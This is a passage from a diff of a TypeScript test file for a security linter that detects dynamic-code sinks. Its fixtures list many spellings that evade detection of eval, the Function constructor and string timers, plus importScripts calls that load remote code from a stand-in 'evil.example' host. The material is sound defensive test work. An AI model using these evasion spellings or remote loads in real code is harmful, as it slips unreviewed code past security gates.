@@ -3,232 +3,290 @@
 // The shared dynamic-code-sink definitions are consumed by FOUR gates
 // (lint:security, check:sw, check:update-channel,
 // check:private-bundle-transparency), so a hole here is a hole in all four.
-// These tests pin both directions: every equivalent sink form is caught, and
-// the ordinary code that surrounds it is not.
+//
+// These tests assert BEHAVIOUR through `findDynamicCodeSinks` — the entry
+// point the gates actually call — rather than poking at internal patterns.
+// That matters historically: detection used to be a family of regexes, and
+// review of PR #169 found a new bypass SPELLING on six consecutive rounds.
+// Every one of those spellings is kept below as a permanent case, and they now
+// pass against a tokeniser that walks the access chain instead of enumerating
+// forms. A test naming a pattern would have had to be rewritten with the
+// implementation; a test naming a BEHAVIOUR carries straight across, which is
+// exactly what made the rewrite safe to do.
 import { describe, expect, it } from 'vitest';
 import {
   BUILT_CODE_SINKS,
-  EVAL_PATTERN,
-  EVAL_PATTERN_STRICT,
-  EVAL_STRING_ARG_PATTERN,
-  FUNCTION_CONSTRUCTOR_PATTERNS,
-  FUNCTION_TAGGED_TEMPLATE_PATTERN,
-  findSinkMatches,
-  INDIRECT_EVAL_PATTERNS,
+  DYNAMIC_CODE_SINKS,
+  findDynamicCodeSinks,
+  REMOTE_IMPORT_SCRIPTS_SINK,
   SOURCE_CODE_SINKS,
-  STRING_TIMER_PATTERNS,
   scanSourceForSinks,
   stripComments,
+  tokenize,
 } from './dangerous-code-patterns.js';
 
-/** True when ANY pattern in the set matches — the way every gate consumes them. */
-const hits = (sinks: ReadonlyArray<{ pattern: RegExp }>, code: string): boolean =>
-  sinks.some(({ pattern }) => pattern.test(code));
+/** Does the shared sink set fire on this source? */
+const fires = (code: string): boolean => findDynamicCodeSinks(code).length > 0;
 
-describe('FUNCTION_CONSTRUCTOR_PATTERNS', () => {
-  // The regression this module exists for: all four gates previously pinned
-  // only `new Function(`, so the equivalent bare call passed every one.
+describe('the Function constructor', () => {
   it.each([
-    ['new Function("return 1")', 'const f = new Function("return 1");'],
+    ['new Function("…")', 'const f = new Function("return 1");'],
+    // The regression this module exists for: all four gates once pinned only
+    // `new Function(`, so the equivalent bare call passed every one.
     ['bare Function()', 'const f = Function("return 1");'],
     ['globalThis.Function()', 'const f = globalThis.Function("x")();'],
     ['window.Function()', 'const f = window.Function("x")();'],
     ['self.Function()', 'const f = self.Function("x")();'],
     ['spaced call', 'const f = Function ("x");'],
-  ])('catches %s', (_label, code) => {
-    expect(FUNCTION_CONSTRUCTOR_PATTERNS.some((p) => p.test(code))).toBe(true);
-  });
-
-  // The indirect forms Codex found on PR #169: the constructor reference can be
-  // parenthesized or reached by computed member access, and each still executes
-  // arbitrary source.
-  it.each([
+    // Round 2: parenthesized and computed references.
     ['parenthesized', "const f = (Function)('return 1');"],
     ['new + parenthesized', "const f = new (Function)('return 1');"],
     ['computed on globalThis', "const f = globalThis['Function']('return 1');"],
     ['computed on window', 'const f = window["Function"]("x");'],
     ['computed on self', "const f = self['Function']('x');"],
-  ])('catches the INDIRECT form: %s', (_label, code) => {
-    expect(FUNCTION_CONSTRUCTOR_PATTERNS.some((p) => p.test(code))).toBe(true);
-  });
-
-  // Round-3 indirections: dot-qualified on a global, optional call, and the
-  // comma/sequence idiom.
-  it.each([
+    // Round 3: optional call and the comma/sequence idiom.
     ['optional call', "const f = Function?.('x');"],
     ['sequence idiom', "const f = (0, Function)('x');"],
-  ])('catches %s', (_label, code) => {
-    expect(FUNCTION_CONSTRUCTOR_PATTERNS.some((p) => p.test(code))).toBe(true);
-  });
-
-  // Round-5 finding: every pattern above requires the reference to be followed
-  // DIRECTLY by a call token, so interposing an inherited function method
-  // defeated all of them. Each form below was verified to actually construct
-  // and run code (all return 42) before the pattern was written.
-  it.each([
+    // Round 4: the template-tag form.
+    ['template tag', 'const f = Function`return 1`();'],
+    // Round 5: inherited function methods.
     ['call', "const f = Function.call(null, 'return 42')();"],
     ['apply', "const f = Function.apply(null, ['return 42'])();"],
     ['bind', "const f = Function.bind(null)('return 42')();"],
     ['global receiver + apply', "globalThis.Function.apply(null, ['x'])();"],
     ['Reflect.apply', "Reflect.apply(Function, null, ['return 42'])();"],
     ['Reflect.construct', "Reflect.construct(Function, ['return 42'])();"],
-    // Round-6: the reflective pattern accepted only the BARE identifier, even
-    // though every direct call site already recognised qualified references.
+    // Round 6: qualified references in reflective position.
     ['Reflect.apply + global receiver', "Reflect.apply(globalThis.Function, null, ['x'])();"],
     ['Reflect.construct + computed', "Reflect.construct(window['Function'], ['x'])();"],
-    // Round-8: the accessor on Reflect ITSELF was still dot-only.
-    ['computed Reflect accessor', "Reflect['apply'](Function, null, ['return 42'])();"],
-    ['computed Reflect.construct', 'Reflect["construct"](Function, ["x"])();'],
-    ['optional Reflect accessor', "Reflect?.apply(Function, null, ['x'])();"],
-    // Round-7: the METHOD side accepted only a plain `.`, so computed and
-    // optional access to the very same inherited method slipped through.
+    // Round 7: computed and optional access to the inherited method.
     ['computed method', "Function['call'](null, 'return 42')();"],
     ['computed method, double quotes', 'Function["apply"](null, ["return 42"])();'],
     ['optional method on a global', "globalThis.Function?.call(null, 'return 42')();"],
     ['optional method, bare', "Function?.bind(null)('return 42')();"],
-  ])('catches the METHOD form: %s', (_label, code) => {
-    expect(FUNCTION_CONSTRUCTOR_PATTERNS.some((p) => p.test(code))).toBe(true);
+    // Round 8: computed access on `Reflect` itself.
+    ['computed Reflect accessor', "Reflect['apply'](Function, null, ['return 42'])();"],
+    ['computed Reflect.construct', 'Reflect["construct"](Function, ["x"])();'],
+    ['optional Reflect accessor', "Reflect?.apply(Function, null, ['x'])();"],
+  ])('catches %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
   });
 
   it.each([
     ['a suffixed identifier', 'const v = getFunction(name);'],
+    ['an AsyncFunction-suffixed identifier', 'const v = isAsyncFunction(fn);'],
+    ['a member access with no call', 'const t = registry.Function;'],
+    ['a type annotation', 'function apply(fn: Function): void {}'],
+    ['a lowercase function declaration', 'function build(x) { return x; }'],
     ['an ordinary .call on some other callee', "handler.call(null, 'x');"],
     ['an ordinary .apply on some other callee', 'fn.apply(this, args);'],
     ['a reflective call on an unrelated callee', 'Reflect.apply(handler, null, [arg]);'],
     ['the same with a computed accessor', "Reflect['apply'](handler, null, [arg]);"],
     ['an unrelated Reflect method', 'Reflect.ownKeys(obj);'],
-    ['an AsyncFunction-suffixed identifier', 'const v = isAsyncFunction(fn);'],
-    ['a member access with no call', 'const t = registry.Function;'],
-    ['a type annotation', 'function apply(fn: Function): void {}'],
-    ['a lowercase function declaration', 'function build(x) { return x; }'],
   ])('does not flag %s', (_label, code) => {
-    expect(FUNCTION_CONSTRUCTOR_PATTERNS.some((p) => p.test(code))).toBe(false);
+    expect(fires(code)).toBe(false);
   });
 });
 
-describe('STRING_TIMER_PATTERNS', () => {
+describe('eval', () => {
+  it.each([
+    'const x = eval("1");',
+    "(eval)('x')",
+    "globalThis['eval']('x')",
+    'window["eval"]("x")',
+    "globalThis.eval('x')",
+    "window.eval('x')",
+    "self.eval('x')",
+    "eval?.('x')",
+    "(0, eval)('x')",
+    // Round 5: inherited methods — indirect eval runs in GLOBAL scope.
+    "eval.call(null, '40+2')",
+    "eval.apply(null, ['40+2'])",
+    "eval.bind(null)('40+2')",
+    "globalThis.eval.call(null, 'x')",
+    "Reflect.apply(eval, null, ['x'])",
+    // Round 6-8: qualified reflective references, computed access.
+    "Reflect.apply(globalThis.eval, null, ['payload'])",
+    "Reflect.apply(self['eval'], null, ['payload'])",
+    "eval['call'](null, '40+2')",
+    "self?.['eval']?.call(null, 'x')",
+    "Reflect['apply'](eval, null, ['payload'])",
+  ])('catches %s', (code) => {
+    expect(fires(code)).toBe(true);
+  });
+
+  // A library method named `eval` is somebody's property, not the global sink.
+  // The token walk gets this right structurally — the old regex needed a
+  // hand-written lookbehind, and that lookbehind is why the computed spellings
+  // below had to be special-cased one at a time.
+  it.each([
+    'await redis.eval(script, 0);',
+    'await client.eval(lua, keys);',
+    'await redis.eval.call(client, script, 0);',
+    'await client.eval.apply(client, [lua, keys]);',
+    "await redis['eval'].call(client, script, 0);",
+    "await redis.eval['apply'](client, [lua, keys]);",
+    'const r = retrieval(query);',
+    'this.#eval(node);',
+  ])('does not flag %s', (code) => {
+    expect(fires(code)).toBe(false);
+  });
+});
+
+describe('string timers (implicit eval)', () => {
   it.each([
     'setTimeout("evil()", 0)',
     "setInterval('evil()', 10)",
     'setTimeout(`evil()`, 0)',
     'setTimeout( "evil()" , 0)',
     'globalThis.setTimeout("evil()", 0)',
+    // Round 5: the same indirections as eval/Function.
+    "setTimeout?.('evil()', 0)",
+    "globalThis.setTimeout?.('evil()', 0)",
+    "globalThis['setTimeout']('evil()', 0)",
+    'self["setInterval"]("evil()", 10)',
+    "(setInterval)('evil()', 10)",
+    "(0, setTimeout)('evil()', 0)",
+    'setTimeout/* c */("evil()", 0)',
+    "setTimeout.call(window, 'evil()', 0)",
+    'setInterval.apply(window, ["evil()", 10])',
+    // Round 6: bound and reflective invocation.
+    "setTimeout.bind(globalThis, 'evil()')()",
+    "Reflect.apply(setTimeout, globalThis, ['evil()'])",
+    "Reflect.apply(globalThis.setTimeout, self, ['evil()'])",
+    // Round 9: computed method access.
+    "setTimeout['call'](globalThis, 'payload')",
+    "globalThis.setTimeout?.call(globalThis, 'payload')",
+    'setInterval["apply"](globalThis, ["payload", 10])',
+    "Reflect['apply'](setTimeout, globalThis, ['evil()'])",
   ])('catches the implicit eval in %s', (code) => {
-    expect(
-      hits(
-        STRING_TIMER_PATTERNS.map((pattern) => ({ pattern })),
-        code,
-      ),
-    ).toBe(true);
+    expect(fires(code)).toBe(true);
   });
 
-  // The round-5 gap: the timer reference is reachable by exactly the same
-  // indirections as `eval`/`Function`, and the host compiles the string
-  // argument either way — so covering only the bare `name(` form left every
-  // one of these passing all four gates.
-  it.each([
-    ['optional call', "setTimeout?.('evil()', 0)"],
-    ['optional call on a global', "globalThis.setTimeout?.('evil()', 0)"],
-    ['computed on globalThis', "globalThis['setTimeout']('evil()', 0)"],
-    ['computed on self', 'self["setInterval"]("evil()", 10)'],
-    ['parenthesized reference', "(setInterval)('evil()', 10)"],
-    ['sequence idiom', "(0, setTimeout)('evil()', 0)"],
-    ['comment gap', 'setTimeout/* c */("evil()", 0)'],
-    // Round-5: the code moves to the SECOND argument through .call/.apply.
-    ['call', "setTimeout.call(window, 'evil()', 0)"],
-    ['apply', 'setInterval.apply(window, ["evil()", 10])'],
-    // Round-6: bound and reflective invocation compile the string too.
-    ['bind', "setTimeout.bind(globalThis, 'evil()')()"],
-    ['Reflect.apply', "Reflect.apply(setTimeout, globalThis, ['evil()'])"],
-    ['Reflect.apply + global receiver', "Reflect.apply(globalThis.setTimeout, self, ['evil()'])"],
-    ['computed Reflect accessor', "Reflect['apply'](setTimeout, globalThis, ['evil()'])"],
-  ])('catches the INDIRECT form: %s', (_label, code) => {
-    expect(
-      hits(
-        STRING_TIMER_PATTERNS.map((pattern) => ({ pattern })),
-        code,
-      ),
-    ).toBe(true);
-  });
-
+  // A FUNCTION argument is the legitimate use and must stay clean through
+  // every one of the same spellings — a widened check that flagged ordinary
+  // scheduling code would simply get suppressed at the call sites.
   it.each([
     'setTimeout(() => run(), 0)',
     'setInterval(tick, 1000)',
     'setTimeout(handler, delayMs)',
-    // The indirect forms must stay quiet on a FUNCTION argument too, or the
-    // widened set would flag ordinary scheduling code.
     "globalThis['setTimeout'](tick, 0)",
     'setTimeout?.(() => run(), 0)',
     '(0, setTimeout)(handler, 0)',
-    // `.call`/`.apply` with a FUNCTION is ordinary code — unlike Function.call,
-    // the timer forms must pin the string's position rather than the shape.
     'setTimeout.call(window, tick, 0);',
     'setTimeout.apply(window, [tick, 0]);',
     'setTimeout.bind(globalThis, tick)();',
     'Reflect.apply(setTimeout, globalThis, [tick, 0]);',
+    'setTimeout(() => self.skipWaiting(), 0);',
   ])('does not flag the function form %s', (code) => {
-    expect(
-      hits(
-        STRING_TIMER_PATTERNS.map((pattern) => ({ pattern })),
-        code,
-      ),
-    ).toBe(false);
+    expect(fires(code)).toBe(false);
   });
 });
 
-describe('eval patterns', () => {
-  it('the source form ignores member/private/suffixed calls', () => {
-    expect(EVAL_PATTERN.test('const x = eval("1");')).toBe(true);
-    // A Redis Lua wrapper method and word-suffix false positives must survive.
-    expect(EVAL_PATTERN.test('await redis.eval(script, 0);')).toBe(false);
-    expect(EVAL_PATTERN.test('const r = retrieval(query);')).toBe(false);
-    expect(EVAL_PATTERN.test('this.#eval(node);')).toBe(false);
+describe('remote importScripts', () => {
+  const remote = (code: string): boolean =>
+    findDynamicCodeSinks(code, [REMOTE_IMPORT_SCRIPTS_SINK]).length > 0;
+
+  it.each([
+    'importScripts("https://x/y.js");',
+    'importScripts("//evil/x.js");',
+    // Round 9: the same indirections as every other sink.
+    "self['importScripts']('https://evil.example/x.js')",
+    "self.importScripts?.('https://evil.example/x.js')",
+    "importScripts.call(self, 'https://evil.example/x.js')",
+  ])('catches %s', (code) => {
+    expect(remote(code)).toBe(true);
   });
 
-  it('the built form is stricter — a member call has no legitimate meaning there', () => {
-    expect(EVAL_PATTERN_STRICT.test('const x = eval("1");')).toBe(true);
-    expect(EVAL_PATTERN_STRICT.test('a.eval("1");')).toBe(true);
+  it.each([
+    'importScripts("sw-push.js");',
+    'importScripts(l);',
+    '// code imported by the generated worker via importScripts — same-origin only',
+  ])('does not flag %s', (code) => {
+    expect(remote(code)).toBe(false);
+  });
+});
+
+describe('comments and prose', () => {
+  // The tokeniser DISCARDS comments, so doctrine can be discussed without
+  // suppressing the gate. This used to require a `commentSensitive` flag and a
+  // separate stripped pass, and getting that wrong produced a false positive
+  // on the shipped service worker (whose header reads "no eval (WS-C.2.1d)").
+  it.each([
+    '// no remote code, no eval (WS-C.2.1d)',
+    '// rejects `new Function`, and eval',
+    '/* importScripts("https://x") is forbidden */',
+    '/* setTimeout("evil()", 0) must never appear */',
+    'const s = "eval(\'x\')";',
+    'const t = \'new Function("x")\';',
+  ])('does not flag %s', (code) => {
+    expect(fires(code)).toBe(false);
   });
 
-  // Both general eval patterns match ordinary PROSE — the real service worker
-  // carries `// …no remote code, no eval (WS-C.2.1d)` — so they are marked
-  // commentSensitive and run only on the stripped copy. The string-argument
-  // form is what keeps eval covered on the RAW pass, so a strip mis-lex cannot
-  // hide `eval('…')` the way it can hide a call the strip blanks away.
-  it('the general eval patterns match prose, which is why they are comment-sensitive', () => {
-    const prose = '// no remote code, no eval (WS-C.2.1d)';
-    expect(EVAL_PATTERN.test(prose)).toBe(true);
-    expect(EVAL_PATTERN_STRICT.test(prose)).toBe(true);
-    // …and the union therefore does NOT report it.
-    expect(scanSourceForSinks(prose, SOURCE_CODE_SINKS)).toEqual([]);
-    expect(scanSourceForSinks(prose, BUILT_CODE_SINKS)).toEqual([]);
+  it('still flags a real call sharing a line with prose about it', () => {
+    expect(fires('eval("x"); // this eval is real')).toBe(true);
+  });
+});
+
+describe('lexing hazards', () => {
+  // Each of these defeated the comment-stripping approach at some point in
+  // review. The tokeniser handles strings, templates and regex literals as
+  // part of lexing, and the ambiguous `/` is resolved by scanning BOTH
+  // readings — so a wrong guess can no longer delete the call.
+  it.each([
+    ['a `/*` inside a string literal', `const start = "/*"; eval("payload"); const end = "*/";`],
+    [
+      'a regex containing `/*`, with a string `*/` later',
+      `if (ok) /[/*]/.test(x); Function('return 42')(); const tail = '*/';`,
+    ],
+    [
+      'the same hiding a NON-literal eval argument',
+      `if (ok) /[/*]/.test(x); eval(payload); const tail = '*/';`,
+    ],
+    ['a call split across a newline', "const f = Function\n('return 1');"],
+    ['an interposed block comment', "const f = Function/* gap */('return 1');"],
+    [
+      'an object literal inside a template interpolation',
+      // Written as a template with escaped `\${` so the interpolation is
+      // FIXTURE TEXT handed to the tokeniser, not something this file
+      // interpolates.
+      `const s = \`\${ {a:1} }\`; eval("payload");`,
+    ],
+  ])('catches a sink despite %s', (_label, code) => {
+    expect(fires(code)).toBe(true);
   });
 
-  it('the string-argument form is prose-safe, so it covers the RAW pass', () => {
-    expect(EVAL_STRING_ARG_PATTERN.test('// no eval (WS-C.2.1d)')).toBe(false);
-    expect(EVAL_STRING_ARG_PATTERN.test(`eval('payload')`)).toBe(true);
-    // The payoff: a file the strip mis-lexes still reports the eval.
-    const misLexed = `if (ok) /[/*]/.test(x); eval('payload'); const tail = '*/';`;
-    expect(stripComments(misLexed)).not.toContain('eval');
-    expect(scanSourceForSinks(misLexed, BUILT_CODE_SINKS).length).toBeGreaterThan(0);
+  it('catches a remote importScripts the same lexing hazard would hide', () => {
+    // Same hazard, but importScripts is not in the default sink set, so it is
+    // scanned with its own spec — the way `check:sw` calls it.
+    const code = `if (ok) /[/*]/.test(x); importScripts('https://evil.example/x.js'); const t = '*/';`;
+    expect(findDynamicCodeSinks(code, [REMOTE_IMPORT_SCRIPTS_SINK])).toHaveLength(1);
+  });
+
+  it('does not mistake ordinary division for a regex', () => {
+    expect(fires('const r = a / b; const s = c / d;')).toBe(false);
+    expect(fires('const r = a++ / b;')).toBe(false);
+  });
+
+  it('reports the line the sink starts on', () => {
+    const code = ['const a = 1;', 'const b = 2;', "eval('x');"].join('\n');
+    expect(findDynamicCodeSinks(code)).toEqual([{ label: 'eval()', line: 3 }]);
   });
 });
 
 describe('the assembled sink sets', () => {
-  const sinkForms = [
-    'const a = eval("1");',
-    'const b = new Function("x");',
-    'const c = Function("x");',
-    'const d = globalThis.Function("x");',
-    'setTimeout("x()", 0);',
-  ];
-
-  it('SOURCE_CODE_SINKS catches every sink form', () => {
-    for (const code of sinkForms) expect(hits(SOURCE_CODE_SINKS, code)).toBe(true);
-  });
-
-  it('BUILT_CODE_SINKS catches every sink form', () => {
-    for (const code of sinkForms) expect(hits(BUILT_CODE_SINKS, code)).toBe(true);
+  it('SOURCE and BUILT agree on every sink form', () => {
+    const forms = [
+      'const a = eval("1");',
+      'const b = new Function("x");',
+      'const c = Function("x");',
+      'const d = globalThis.Function("x");',
+      'setTimeout("x()", 0);',
+    ];
+    for (const code of forms) {
+      expect(findDynamicCodeSinks(code, SOURCE_CODE_SINKS).length).toBeGreaterThan(0);
+      expect(findDynamicCodeSinks(code, BUILT_CODE_SINKS).length).toBeGreaterThan(0);
+    }
   });
 
   it('neither set flags ordinary code', () => {
@@ -238,275 +296,84 @@ describe('the assembled sink sets', () => {
       'const parsed = JSON.parse(raw);',
       'await redis.eval(script, 0);',
     ].join('\n');
-    expect(hits(SOURCE_CODE_SINKS, clean)).toBe(false);
+    expect(findDynamicCodeSinks(clean, SOURCE_CODE_SINKS)).toEqual([]);
+    expect(findDynamicCodeSinks(clean, BUILT_CODE_SINKS)).toEqual([]);
   });
 
-  it('every entry carries a human label the gates can phrase', () => {
-    for (const { label } of [...SOURCE_CODE_SINKS, ...BUILT_CODE_SINKS]) {
+  it('every sink carries a human label the gates can phrase', () => {
+    for (const { label } of [...DYNAMIC_CODE_SINKS, REMOTE_IMPORT_SCRIPTS_SINK]) {
       expect(label.length).toBeGreaterThan(0);
     }
   });
-});
 
-describe('INDIRECT_EVAL_PATTERNS', () => {
-  it.each(["(eval)('x')", "globalThis['eval']('x')", 'window["eval"]("x")'])(
-    'catches indirect eval: %s',
-    (code) => {
-      expect(INDIRECT_EVAL_PATTERNS.some((p) => p.test(code))).toBe(true);
-    },
-  );
-
-  // Round-3: the global-object receivers, the optional call, and the canonical
-  // `(0, eval)` idiom all reach the same sink.
-  it.each([
-    "globalThis.eval('x')",
-    "window.eval('x')",
-    "self.eval('x')",
-    "eval?.('x')",
-    "(0, eval)('x')",
-  ])('catches %s', (code) => {
-    expect(INDIRECT_EVAL_PATTERNS.some((p) => p.test(code))).toBe(true);
-  });
-
-  // Round-5: `eval.call`/`eval.apply` are indirect eval — they evaluate in
-  // GLOBAL scope — and every pattern above required a call token straight
-  // after the reference, so all of them passed.
-  it.each([
-    ['call', "eval.call(null, '40+2')"],
-    ['apply', "eval.apply(null, ['40+2'])"],
-    ['bind', "eval.bind(null)('40+2')"],
-    ['global receiver + call', "globalThis.eval.call(null, 'x')"],
-    ['Reflect.apply', "Reflect.apply(eval, null, ['x'])"],
-    ['Reflect.apply + global receiver', "Reflect.apply(globalThis.eval, null, ['payload'])"],
-    ['Reflect.apply + computed', "Reflect.apply(self['eval'], null, ['payload'])"],
-    ['computed Reflect accessor', "Reflect['apply'](eval, null, ['payload'])"],
-    ['computed method', "eval['call'](null, '40+2')"],
-    ['optional computed receiver + optional method', "self?.['eval']?.call(null, 'x')"],
-  ])('catches the METHOD form: %s', (_label, code) => {
-    expect(INDIRECT_EVAL_PATTERNS.some((p) => p.test(code))).toBe(true);
-  });
-
-  it('does not flag a LIBRARY member eval — the Redis Lua wrapper must survive', () => {
-    for (const code of [
-      'await redis.eval(script, 0);',
-      'await client.eval(lua, keys);',
-      // The method forms carry the same lookbehind, so a library wrapper
-      // invoked through `.call` is still not a sink.
-      'await redis.eval.call(client, script, 0);',
-      'await client.eval.apply(client, [lua, keys]);',
-      // The computed-method widening must not reach a library wrapper either.
-      "await redis['eval'].call(client, script, 0);",
-      "await redis.eval['apply'](client, [lua, keys]);",
-    ]) {
-      expect(INDIRECT_EVAL_PATTERNS.some((p) => p.test(code))).toBe(false);
-    }
+  it('reports one finding per sink occurrence, not one per matching rule', () => {
+    expect(findDynamicCodeSinks('eval("x");')).toHaveLength(1);
   });
 });
 
-describe('findSinkMatches (whole-text scan)', () => {
-  // Every sink pattern allows whitespace between the callee and its `(`, and
-  // that whitespace may be a NEWLINE — a per-line scan can never match these
-  // however permissive the pattern is.
-  it.each([
-    ['Function across a newline', "const f = Function\n('return 1');"],
-    ['parenthesized across a newline', "const f = (Function)\n('return 1');"],
-    ['eval across a newline', "const v = eval\n('1');"],
-  ])('catches %s', (_label, code) => {
-    expect(findSinkMatches(code).length).toBeGreaterThan(0);
+describe('tokenize', () => {
+  it('skips comments, strings, templates and regex literals', () => {
+    const kinds = tokenize('// c\n/* c */ "s" `t` ; /re/ ; x').map((t) => t.kind);
+    expect(kinds).toEqual(['string', 'template', 'punct', 'regex', 'punct', 'ident']);
   });
 
-  it('reports the line the match STARTS on', () => {
-    const code = ['const a = 1;', 'const b = 2;', "eval('x');"].join('\n');
-    expect(findSinkMatches(code)).toEqual([{ label: 'eval()', line: 3 }]);
+  it('keeps a template with an interpolation as ONE token', () => {
+    expect(tokenize(`\`a\${ {b:1} }c\``)).toHaveLength(1);
   });
 
-  it('finds nothing in ordinary multi-line code', () => {
-    const code = ['export function build(x) {', '  return getFunction(x);', '}'].join('\n');
-    expect(findSinkMatches(code)).toEqual([]);
-  });
-});
-
-describe('scanSourceForSinks (raw ∪ stripped)', () => {
-  // The class of bug found three times in review: a strip that DELETED the call
-  // it was meant to reveal. Scanning raw as well makes the strip non-load-bearing
-  // — it can only ever ADD findings, never remove them.
-  it('catches a sink even when the strip mis-lexes the surrounding code', () => {
-    // `a++ / b` is a division; a lexer that reads the `/` as a regex start
-    // swallows the following `/*gap*/` comment and hides the constructor.
-    const source = "a++ / b; Function/*gap*/('globalThis.pwned=true')();";
-    expect(scanSourceForSinks(source).length).toBeGreaterThan(0);
-  });
-
-  it('still catches the comment-gap form the raw pass cannot see', () => {
-    const source = "const f = Function/*gap*/('return 1');";
-    expect(scanSourceForSinks(source).length).toBeGreaterThan(0);
-  });
-
-  it('reports each (line, label) once despite scanning twice', () => {
-    expect(scanSourceForSinks("eval('x');")).toEqual([{ label: 'eval()', line: 1 }]);
-  });
-
-  it('finds nothing in ordinary code', () => {
-    expect(scanSourceForSinks('export const go = () => getFunction(name);')).toEqual([]);
-  });
-});
-
-describe('the in-pattern comment gap', () => {
-  // The patterns themselves tolerate an interposed comment, so the comment-gap
-  // form is caught on RAW source — no whole-file lexing required. That is what
-  // makes the scan robust against a mis-lex rather than dependent on a correct
-  // one.
-  it.each([
-    ['constructor', "Function/*gap*/('return 1')"],
-    ['eval', "eval/*gap*/('1')"],
-    ['multi-line comment gap', 'Function/* a\n b */("x")'],
-    ['several comments', 'Function/*a*//*b*/("x")'],
-  ])('matches through the gap on RAW source: %s', (_label, code) => {
-    expect(findSinkMatches(code).length).toBeGreaterThan(0);
-  });
-
-  it('catches a sink the STRIP cannot reach — nested braces in an interpolation', () => {
-    // An object literal inside `${…}` used to end the interpolation early, so
-    // the strip left the comment in place. The raw pass no longer cares.
-    // biome-ignore lint/suspicious/noTemplateCurlyInString: this string IS the source text under test — the `${…}` must stay literal, not interpolate.
-    const source = "const x = `${{a:1}.a, Function/*gap*/('payload')()}`;";
-    expect(scanSourceForSinks(source).length).toBeGreaterThan(0);
-  });
-
-  it('does not run away on ordinary comment-heavy code', () => {
-    const clean = [
-      '/** doc */',
-      'export const go = () => {',
-      '  // note',
-      '  return 1;',
-      '};',
-    ].join('\n');
-    expect(findSinkMatches(clean)).toEqual([]);
-  });
-});
-
-describe('FUNCTION_TAGGED_TEMPLATE_PATTERN', () => {
-  // Round-4: `Function` as a TEMPLATE TAG constructs and runs the same function
-  // (verified by execution, not assumed) — every other pattern requires `(`.
-  it.each([
-    ['tagged template', 'Function`globalThis.pwned=true`();'],
-    ['tagged template with a comment gap', 'Function /* c */ `body`();'],
-  ])('catches %s through scanSourceForSinks: %#', (_label, code) => {
-    expect(scanSourceForSinks(code).length).toBeGreaterThan(0);
-  });
-
-  it('is COMMENT-SENSITIVE, so markdown prose does not trip it', () => {
-    // A doc comment writing `` `new Function` `` puts a backtick straight after
-    // the word — textually identical to a tag. Running this pattern on raw
-    // source produced exactly that false positive on `update/sw-pinning.ts`.
-    const prose = '// it issues no `importScripts`, `eval`, or `new Function`, and runs no code';
-    expect(scanSourceForSinks(prose)).toEqual([]);
-  });
-
-  it('is flagged commentSensitive in both sink sets', () => {
-    for (const set of [SOURCE_CODE_SINKS, BUILT_CODE_SINKS]) {
-      const tag = set.find((s) => s.pattern === FUNCTION_TAGGED_TEMPLATE_PATTERN);
-      expect(tag?.commentSensitive).toBe(true);
-    }
-  });
-});
-
-describe('linearity (ReDoS canary)', () => {
-  // The first cut of the in-pattern gap used `\s+` inside the outer `*`, which
-  // nests two quantifiers over the same characters and made `lint:security` run
-  // unbounded (killed at 9+ minutes of 100% CPU). These bound the shape that
-  // triggered it so a future edit to GAP cannot quietly reintroduce it.
-  it('matches a long whitespace gap followed by a NON-match in linear-ish time', () => {
-    const started = Date.now();
-    findSinkMatches(`Function${' '.repeat(5000)}X`);
-    expect(Date.now() - started).toBeLessThan(2000);
-  });
-
-  it('scans a large, deeply indented file quickly', () => {
-    const started = Date.now();
-    findSinkMatches(`${'\n    '.repeat(20000)}const a = 1;`);
-    expect(Date.now() - started).toBeLessThan(2000);
-  });
-
-  it('scans a comment-heavy file quickly', () => {
-    const started = Date.now();
-    findSinkMatches(`${'/* filler comment */\n'.repeat(5000)}const a = 1;`);
-    expect(Date.now() - started).toBeLessThan(2000);
+  it('does not run an unterminated string past its line', () => {
+    // An unterminated literal must not swallow the rest of the file and hide
+    // whatever follows it.
+    expect(fires("const bad = 'oops\neval('x');")).toBe(true);
   });
 });
 
 describe('stripComments', () => {
-  // A comment placed INSIDE a call — `Function/*gap*/('…')` — split the token
-  // stream so no pattern matched; stripping first closes that route.
-  it('closes the comment-gap route into the Function constructor', () => {
-    const code = stripComments("const f = Function/*gap*/('return 1');");
-    expect(hits(SOURCE_CODE_SINKS, code)).toBe(true);
-  });
-
-  it('PRESERVES line numbers across a multi-line block comment', () => {
-    // Gates report `file:line`. Collapsing a 4-line comment to one space would
-    // point every later violation at the wrong line.
-    const source = ['const a = 1;', '/* one', '   two', '   three */', "eval('x');"].join('\n');
-    const stripped = stripComments(source);
-    expect(stripped.split('\n')).toHaveLength(source.split('\n').length);
-    expect(stripped.split('\n').findIndex((l) => /eval/.test(l))).toBe(4);
-  });
-
-  // The regression a regex-based strip introduced: comment delimiters INSIDE
-  // string literals were treated as real delimiters, so the strip itself
-  // deleted the code between them — hiding a sink from every gate. Strictly
-  // worse than not stripping at all.
-  it('does NOT treat comment delimiters inside string literals as comments', () => {
-    const source = 'const start = "/*"; eval("payload"); const end = "*/";';
-    const stripped = stripComments(source);
-    expect(stripped).toBe(source); // nothing here is a comment
-    expect(hits(SOURCE_CODE_SINKS, stripped)).toBe(true);
-  });
-
-  it.each([
-    ['single quotes', "const s = '/*'; eval('x'); const e = '*/';"],
-    ['template literal', 'const s = `/*`; eval("x"); const e = `*/`;'],
-    ['a // inside a string', 'const s = "// not a comment"; eval("x");'],
-    ['a regex literal containing a slash', 'const re = /a\\/b/; eval("x");'],
-  ])('keeps code visible past a comment delimiter in %s', (_label, source) => {
-    expect(hits(SOURCE_CODE_SINKS, stripComments(source))).toBe(true);
-  });
-
-  it('is LENGTH- and NEWLINE-preserving, so match offsets map to real lines', () => {
-    const source = [
-      'const a = 1; // trailing',
-      '/* one',
-      '   two */',
-      'const s = "/* not a comment */";',
-      "eval('x');",
-    ].join('\n');
+  // No longer load-bearing for sink detection, but still used for the
+  // update-channel MARKER checks, so its offset-preserving contract stands.
+  it('preserves length and newlines so offsets still map to lines', () => {
+    const source = 'const a = 1; // note\n/* block */ const b = 2;\n';
     const stripped = stripComments(source);
     expect(stripped).toHaveLength(source.length);
-    expect((stripped.match(/\n/g) ?? []).length).toBe((source.match(/\n/g) ?? []).length);
+    expect(stripped.split('\n')).toHaveLength(source.split('\n').length);
   });
 
-  it('lets doctrine be discussed in prose without tripping a scan', () => {
-    const code = stripComments('// never call eval() here\n/* nor new Function() */\nrun();');
-    expect(hits(SOURCE_CODE_SINKS, code)).toBe(false);
+  it('blanks comments but keeps code and string contents', () => {
+    const stripped = stripComments('const a = "keep /* me */"; // drop\n');
+    expect(stripped).toContain('keep /* me */');
